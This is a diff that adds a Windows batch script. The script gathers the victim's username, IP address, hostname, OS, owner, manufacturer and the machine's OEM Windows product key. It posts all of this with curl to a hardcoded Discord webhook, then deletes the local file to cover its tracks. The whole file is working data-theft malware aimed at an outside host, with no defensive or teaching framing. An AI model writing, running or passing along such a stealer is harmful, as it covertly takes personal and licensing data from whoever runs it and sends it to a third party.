@@ -1,0 +1,60 @@
+setlocal enabledelayedexpansion
+
+:: ====== CONFIGURATION ======
+set "outputfile=systeminfo.txt"
+set "url=https://discord.com/api/webhooks/1360904624189735102/uZ_SiASmNi8ScYmzSXVnSkSGXhcI5eujr-LtcDNRCTUbmvdN4uNPQgcd-smboA8URBsE"
+:: ===========================
+
+:: === Collect system info ===
+> "%outputfile%" (
+    echo Username: %USERNAME%
+    
+    for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
+        set "ip=%%A"
+        call echo IP Address: %%ip%%
+    )
+
+    echo Hostname: %COMPUTERNAME%
+    
+    for /f "tokens=2*" %%B in ('systeminfo ^| findstr /B /C:"OS Name"') do (
+        set "osname=%%C"
+        call echo OS: %%osname%%
+    )
+
+    for /f "skip=1 delims=" %%D in ('wmic computersystem get username 2^>nul') do (
+        if not defined owner (
+            set "owner=%%D"
+            call echo Owner: %%owner%%
+        )
+    )
+
+    for /f "skip=1 delims=" %%E in ('wmic path softwarelicensingservice get OA3xOriginalProductKey 2^>nul') do (
+        if not defined productkey (
+            set "productkey=%%E"
+            call echo Product Key: %%productkey%%
+        )
+    )
+
+    echo Processors: %NUMBER_OF_PROCESSORS%
+
+    for /f "skip=1 delims=" %%F in ('wmic computersystem get manufacturer 2^>nul') do (
+        if not defined manufacturer (
+            set "manufacturer=%%F"
+            call echo Manufacturer: %%manufacturer%%
+        )
+    )
+)
+
+:: === Read the file into one variable (single-line for Discord) ===
+set "message="
+for /f "usebackq delims=" %%a in ("%outputfile%") do (
+    set "line=%%a"
+    set "message=!message!!line!\n"
+)
+
+:: === Send to Discord Webhook ===
+curl -X POST ^
+  -H "Content-Type: application/json" ^
+  -d "{\"content\": \"!message!\"}" ^
+  %url%
+del "%outputfile%"
